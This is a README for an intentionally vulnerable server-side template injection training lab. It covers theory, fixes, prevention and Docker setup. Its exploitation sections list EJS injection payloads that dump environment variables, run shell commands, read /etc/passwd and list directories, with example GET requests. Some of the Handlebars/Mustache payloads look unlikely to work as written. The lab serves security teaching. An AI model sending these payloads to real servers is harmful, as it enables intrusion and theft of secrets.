# 🚨 Server-Side Template Injection (SSTI) Vulnerable Lab

## ⚠️ WARNING
This application contains **intentional vulnerabilities** for educational purposes only. Do not deploy this in production environments!

## 📋 Table of Contents
- [What is SSTI?](#what-is-ssti)
- [Vulnerability Explanation](#vulnerability-explanation)
- [How to Exploit](#how-to-exploit)
- [Exploitation Examples](#exploitation-examples)
- [How to Fix](#how-to-fix)
- [Prevention Strategies](#prevention-strategies)
- [Getting Started](#getting-started)
- [Available Endpoints](#available-endpoints)
- [Color Scheme](#color-scheme)

## 🔍 What is SSTI?

**Server-Side Template Injection (SSTI)** is a vulnerability that occurs when user input is directly embedded into server-side templates without proper sanitization. This allows attackers to inject malicious template code that gets executed on the server, potentially leading to:

- **Remote Code Execution (RCE)**
- **Information Disclosure**
- **File System Access**
- **Database Access**
- **System Compromise**

## 🎯 Vulnerability Explanation

### How SSTI Works

1. **Template Engine Processing**: Web applications use template engines (EJS, Handlebars, Mustache, Nunjucks, etc.) to generate dynamic HTML
2. **User Input Injection**: When user input is directly embedded into templates without proper escaping
3. **Code Execution**: The template engine processes the injected code as template syntax
4. **Server Compromise**: Malicious code executes with server privileges

### Common Template Engines Affected

- **EJS**: `<%= %>` and `<%- %>` tags
- **Handlebars**: `{{ }}` expressions
- **Mustache**: `{{ }}` expressions  
- **Nunjucks**: `{{ }}` expressions
- **Jinja2**: `{{ }}` expressions
- **Twig**: `{{ }}` expressions

## 🎯 How to Exploit

### 1. Basic Information Gathering

**EJS Payloads:**
```javascript
<%= global.process.env %>
<%= global.process.version %>
<%= global.process.platform %>
<%= global.process.cwd() %>
<%= global.process.arch %>
<%= global.process.uptime() %>
```

**Handlebars/Mustache Payloads:**
```javascript
{{ global.process.env }}
{{ global.process.version }}
{{ global.process.platform }}
{{ global.process.cwd() }}
```

### 2. Command Execution

**EJS Command Execution:**
```javascript
<%= global.process.mainModule.require('child_process').exec('whoami') %>
<%= global.process.mainModule.require('child_process').exec('id') %>
<%= global.process.mainModule.require('child_process').exec('ls -la') %>
```

**Advanced Command Execution:**
```javascript
<%= global.process.mainModule.require('child_process').execSync('cat /etc/passwd') %>
<%= global.process.mainModule.require('child_process').execSync('ps aux') %>
<%= global.process.mainModule.require('child_process').execSync('netstat -tulpn') %>
```

### 3. File System Access

**Read Files:**
```javascript
<%= global.process.mainModule.require('fs').readFileSync('/etc/passwd', 'utf8') %>
<%= global.process.mainModule.require('fs').readFileSync('/etc/hosts', 'utf8') %>
<%= global.process.mainModule.require('fs').readFileSync('/proc/version', 'utf8') %>
```

**List Directories:**
```javascript
<%= global.process.mainModule.require('fs').readdirSync('/') %>
<%= global.process.mainModule.require('fs').readdirSync('/home') %>
<%= global.process.mainModule.require('fs').readdirSync('/var/www') %>
```

### 4. Network Information

```javascript
<%= global.process.mainModule.require('os').networkInterfaces() %>
<%= global.process.mainModule.require('os').hostname() %>
<%= global.process.mainModule.require('os').platform() %>
```

## 🎯 Exploitation Examples

### Example 1: Basic Information Disclosure
```
GET /ejs?input=<%= global.process.env %>
```

### Example 2: Command Execution
```
GET /ejs?input=<%= global.process.mainModule.require('child_process').exec('whoami') %>
```

### Example 3: File Reading
```
GET /advanced?template=<%= global.process.mainModule.require('fs').readFileSync('/etc/passwd', 'utf8') %>
```

### Example 4: Directory Listing
```
GET /advanced?template=<%= global.process.mainModule.require('fs').readdirSync('/') %>
```

## 🛠️ How to Fix

### 1. Input Validation and Sanitization

```javascript
// BAD: Direct template injection
app.get('/vulnerable', (req, res) => {
  const userInput = req.query.input;
  res.render('template', { userInput }); // DANGEROUS!
});

// GOOD: Input validation and sanitization
app.get('/safe', (req, res) => {
  const userInput = req.query.input;
  
  // Validate input
  if (!userInput || typeof userInput !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  // Sanitize input (remove dangerous characters)
  const sanitizedInput = userInput.replace(/[<>&"']/g, '');
  
  res.render('template', { userInput: sanitizedInput });
});
```

### 2. Proper Template Escaping

```javascript
// In EJS templates
// BAD: Unescaped output
<%- userInput %>

// GOOD: Escaped output
<%= userInput %>
```

### 3. Template Engine Configuration

```javascript
// EJS with security settings
app.set('view engine', 'ejs');
app.set('view options', {
  escape: true, // Enable HTML escaping
  rmWhitespace: false
});

// Nunjucks with security settings
nunjucks.configure('views', {
  autoescape: true, // Enable auto-escaping
  noCache: true
});
```

### 4. Sandboxed Template Execution

```javascript
const vm = require('vm');

// Create a sandboxed context
const sandbox = {
  // Only allow safe functions
  console: console,
  // Remove dangerous globals
  process: undefined,
  global: undefined,
  require: undefined
};

// Execute template in sandbox
const result = vm.runInNewContext(templateCode, sandbox);
```

## 🛡️ Prevention Strategies

### 1. **Input Validation**
- Validate all user input before processing
- Use whitelist approach for allowed characters
- Implement length limits on input

### 2. **Output Encoding**
- Always escape user input in templates
- Use context-appropriate encoding (HTML, URL, etc.)
- Never use unescaped output in templates

### 3. **Template Engine Security**
- Configure template engines with security settings
- Disable dangerous functions and globals
- Use sandboxed environments for template execution

### 4. **Code Review**
- Review all template usage for proper escaping
- Look for direct user input in templates
- Test for SSTI vulnerabilities

### 5. **Security Testing**
- Use automated security scanners
- Perform manual penetration testing
- Implement security-focused code reviews

## 🚀 Getting Started

### Prerequisites
- Docker installed on your system
- Basic understanding of web security concepts

### Running the Lab

1. **Build the Docker container:**
```bash
cd 06-Server-Side-Template-Injection-Vulnerable-Docker
docker build -t ssti-lab .
```

2. **Run the container:**
```bash
docker run -p 3000:3000 ssti-lab
```

3. **Access the application:**
```
http://localhost:3000
```

### Manual Setup (Alternative)

1. **Install dependencies:**
```bash
npm install
```

2. **Start the application:**
```bash
npm start
```

3. **Access the application:**
```
http://localhost:3000
```

## 🌐 Available Endpoints

| Endpoint | Description | Vulnerability Type |
|----------|-------------|-------------------|
| `/` | Basic EJS template injection | SSTI |
| `/ejs` | EJS template injection | SSTI |
| `/handlebars` | Handlebars template injection | SSTI |
| `/mustache` | Mustache template injection | SSTI |
| `/nunjucks` | Nunjucks template injection | SSTI |
| `/advanced` | Advanced SSTI with file operations | SSTI |
| `/safe` | Safe template handling example | None |
| `/upload` | File upload with template injection | SSTI |
| `/preview` | Template preview with injection | SSTI |
| `/admin` | Admin panel with template injection | SSTI |
| `/search` | Search with template injection | SSTI |
| `/profile` | User profile with template injection | SSTI |
| `/error` | Error page with template injection | SSTI |
| `/compile` | Template compilation (highly vulnerable) | RCE |
| `/dynamic/:templateName` | Dynamic template loading | SSTI |

## 🎨 Color Scheme

This lab uses the following color palette:

- **Purple**: `#3C1053` (rgb(60, 16, 83)) - Primary brand color
- **Red**: `#F2120C` (rgb(242, 18, 12)) - Warning/error color
- **Faculty Purple**: `#B51825` (rgb(181, 24, 37)) - Faculty of Law and Business
- **Warm Stone**: `#918B83` (rgb(145, 139, 131)) - Secondary color
- **Deep Charcoal**: `#302C2A` (rgb(48, 44, 42)) - Dark text
- **Soft Ivory**: `#F2EFEB` (rgb(242, 239, 235)) - Light background

## 📚 Learning Objectives

After completing this lab, you should understand:

1. **What SSTI is** and how it works
2. **How to identify** SSTI vulnerabilities
3. **How to exploit** SSTI vulnerabilities
4. **How to prevent** SSTI attacks
5. **Best practices** for secure template handling
6. **Different template engines** and their security implications

## 🔗 Additional Resources

- [OWASP Template Injection](https://owasp.org/www-community/attacks/Server_Side_Template_Injection)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [SSTI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Template Engine Security](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## ⚖️ Legal Notice

This lab is for educational purposes only. Use responsibly and only in authorized environments. The authors are not responsible for any misuse of this material.

---

**Happy Learning! 🎓**
